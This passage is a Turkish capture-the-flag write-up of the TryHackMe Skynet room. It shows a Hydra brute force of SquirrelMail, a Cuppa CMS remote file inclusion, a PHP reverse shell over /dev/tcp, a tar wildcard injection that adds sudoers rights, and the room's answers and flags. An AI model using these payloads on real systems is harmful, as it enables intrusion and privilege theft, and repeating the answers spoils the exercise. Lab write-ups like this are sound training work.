# **[İçeriğin orijinalini görmek için linke tıklayın](https://sibermetin.com/tryhackme-skynet-write-up-vip)**

---
[Skynet](https://tryhackme.com/room/sakura) odasının makine çözümü hakkında bir yazı. İyi çalışmalar.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4c3149cc22.jpg)

Bu çözümde kullanılan ip adresi: 10.10.113.41

Açık port var mı diye öncelikle nmap taraması yapalım.

***nmap -A -T4 10.10.113.41***

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390eec03e017.jpg)

Terminalden de görüldüğü üzere ssh, http ve samba portu açıktır.

Ip adresini firefox tarayıcısında araştıralım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390ef54d2862.jpg)

Karşımıza SHYNET diye bir arama motoru çıkıyor. Sayfa kaynağını incelediğimizde herhangi önemli bir şeye rastlanılmamaktadır. Input alanı da zafiyet içermemektedir.

Gobuster aracı ile sayfanın dizinlerini araştıralım.

    gobuster dir -u http://10.10.113.41/ -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f2c8bd2e4.jpg)

/squirrelmail adlı uzantıya girelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f3208bc7e.jpg)

Karşımıza SquirrelMail diye bir giriş paneli çıktı.

Şimdi "enum4linux" toolunu kullanarak  SquirrelMail için kullanıcı adı ve şifre bulalım.

    enum4linux -a 10.10.113.41

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f415dfac0.jpg)
![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f4c1a585b.jpg)
![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f51be4663.jpg)

"milesdyson" adlı kullanıcı adına ve "anonymous smb share" bilgisine ulaştık.

Şimdi anonim paylaşıma erişelim. Sonra bulabileceğimiz dosyaları ana makinemize aktarıp ve inceleyelim.

    smbclient  //10.10.113.41/anonymous

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f6f91b56f.jpg)

attention.txt, log1.txt, log2.txt ve log3.txt dosyalarını "get" ile indirelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390f9c6c5e30.jpg)

Şimdi txt dosyalarımızı incelemeye başlayabiliriz. Önce log1.txt inceleyelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390faf032db9.jpg)

Burada worldlist'e benzeyen bir metin belgesi gözüküyor. Şimdi diğer txt dosyalarına bakalım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6390fafa5848f.jpg)

log2.txt ve log3.txt boş dosyadır. attention.txt dosyasında ise Miles Dyson tüm skynet çalışanlarının şifrelerinin değiştirmesini istediği bir not.

Şimdi bakalım elimizde neler var:

Bir kelime listemiz
Bir kullanıcı adımız
Bir Squirrelmail giriş portalımız
Açık bir ssh portumuz

*Makinemin süresi dolduğu için "10.10.107.102 " bu ip adresi ile çözüme devam edeceğim. Siz kendi ip adresiniz ile devam edin.*

Bizim şuan squirrealmaile ihtiyacımız var. Bunun için Hydra aracını kullanacağız.

Öncelikle kolaylık olsun diye indirdiğim dosyaları masaüstüne atacağım. İsterseniz atmayabilirsiniz :)

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63932f53553a5.jpg)

    hydra -l milesdyson -P /root/Desktop/log1.txt 10.10.107.102 http-post "/squirrelmail"

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63932fa1d5b60.jpg)

Burada bir sürü şifre bulduk. Soru formatına en uygunu ikinci verilen şifredir.

## SORU 1: E-postaları içim Miles şifresi nedir?

## CEVAP:  cyborg007haloterminator

Şifreyi ve kullanıcı adını bulduk. Haydi giriş paneline girelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639333b65d08a.jpg)

Bizi şöyle bir sayfa karşılıyor:

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639334716b5b9.jpg)

Samba Password yazan ilk maile bakalım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639335072b3fe.jpg)

SMB şifresine ulaştık bu harika.

Şimdi de ikinci mailine bakalım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639335d082828.jpg)

Binary ile şifrelenmiş bir mail bulunmaktadır. Çevrim içi binary decoder ile şifreyi çözelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639336aa72205.jpg)

Topların benim için sıfırı var, bana bana ............  diye bir mail çıktı. İpucu olmaya da bilir emin değilim. Şimdi son maile de bakalım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6393379814fc9.jpg)

Yine anlamsız bir şey çıktı.

Bu maillerden sadece 'milesdyson' smb paylaşımı için şifresini bulduk, şimdi bunu numaralandırabiliriz.

    smbclient  //10.10.107.102/milesdyson -U milesdyson 

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639339d68651e.jpg)

/Notes

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63933bb804dd8.jpg)

İlk gözüme çarpan important.txt oldu. Önemli olmasa önemli demezlerdi herhalde  :D . important.txt indirip inceleyelim bakalım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63933d08b3e85.jpg)
![resim](https://sibermetin.com/uploads/images/202212/image_750x_63933d23cb15c.jpg)

## SORU 2: Gizli dizin nedir?

## CEVAP: /45kra24zxs28v3yd

Gizli dizine girelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63933eb167597.jpg)

Böyle bir sayfa karşımıza çıkıyor. Kaynak kodlarını inceleyelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63933f65284df.jpg)

Burada da herhangi bir şey bulamadık. Daha önce de yaptığımız gobuster aracını kullanarak başka dizin var mı bakacağız.

    gobuster dir -u http://10.10.107.102/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639341f1e6383.jpg)

Buradan /administrator dizinini bulduk. Şimdi bu dizine girelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_639342e9b112f.jpg)

Bir giriş paneli daha bulduk. CMS için zafiyet var mı bi bakalım.
    searchsploit Cuppa

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6393454fc07d5.jpg)

Bu istismarı makinemize indirelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_6393465423ed9.jpg)

Bu istismar uzaktan dosya eklemedir.

## SORU 3: Kötü amaçlı amaçlarla uzak dosya ekleyebildiğinizde bu güvenlik açığına ne denir?

## CEVAP: Remote File Inclusion

*Makinemin süresi dolduğu için "10.10.249.122 " bu ip adresi ile çözüme devam edeceğim. Siz kendi ip adresiniz ile devam edin.*

Cuppa CMS'yi etkileyen RFI güvenlik açıklarını aramak [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971) yol açar.

Şimdi bu güvenlik açığını doğrulayalım:

    curl -s http://10.10.129.122/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a456ed1dab3.jpg)

Harika.

    /**
    * Plugin Name: Wordpress Reverse Shell
    * Author:
    */
    exec(“/bin/bash -c ‘bash -i >& /dev/tcp// 0>&1’”)
    ?>

Bu kodu kullanarak, IP ve Portu IP adresinizle ve ters kabuk dinleyicimizde kullanılacak bir Port ile değiştirerek küçük bir tek satırlık ters kabuk dosyası oluşturalım.

Tanımladığımız bu porta bir netcat dinleyicisi ayarlayalım:

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a46bf5ad046.jpg)

Şimdi python kullanarak ters kabuk sahip olduğumuz dizinde bir http sunucusu yayınlamamız gerekiyor.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a46d6ec06a9.jpg)

    http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.21.24/rshell.php

Bunu tarayıcımızdan açalım. Bize ters bir kabuk açacaktır.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a46ea7950c9.jpg)

Ana dizine erişimimizin olup olmadığına bakalım.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a46f1c3607d.jpg)

## SORU 4: Kullanıcı bayrağı nedir?

## CEVAP: 7ce5c2109a40f958099283600a9ae807

Root bayrağı bulmak için yetki yükseltme yapmamız gerekecek.

    python -c ‘import pty;pty.spawn(“/bin/bash”)’

Bu kodu kullanarak etkileşimli bir tty kabuğuna yükseltmemiz gerekir.

sudo -l komutu ile sudo izinleri kontrol edebiliriz.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4af11b41da.jpg)

Sudo yaparak bir şeyleri çalıştırıp çalıştıramama iznimiz bulunmamaktadır. Bunun yerine contrabı deneyelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4b227a67d6.jpg)

Komut dosyasındaki izinleri kontrol edelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4b2ede1bf5.jpg)

Dosyaları yeniden adlandırma e içinde yeni dosyalar oluşturma iznimizin olmadığını görüyoruz. backup.sh dosyasını inceleyelim.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4b3e9b6437.jpg)

Bu komut dosyası root olarak çalışır. Dizini '/var/www/html' olarak değiştirir ve ardından dizinin içeriğini '/home/milesdyson/backups' adresindeki backup.tgz adlı bir dosyaya sıkıştırmak için tar kullanır.

    echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
    touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
    touch "/var/www/html/--checkpoint=1"

Kullanıcımızı sudoers'a eklemek ve makinedeyken root kazanmak için bu kodu kullanarak komut dosyası oluşturalım.

/var/www/html dizinimizde bu komutu çalıştırdıktan sonra, yedeklenen dizinin içinde 3 yeni dosyamız olmalıdır.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4b8a02f30b.jpg)

Veee artık root erişimimizi sudo su kullanarak elde edebiliriz.

![resim](https://sibermetin.com/uploads/images/202212/image_750x_63a4b91db6f47.jpg)

## SORU 5: Kök bayrağı nedir?

## CEVAP: 3f0372db24753accc7179a282cd6a949
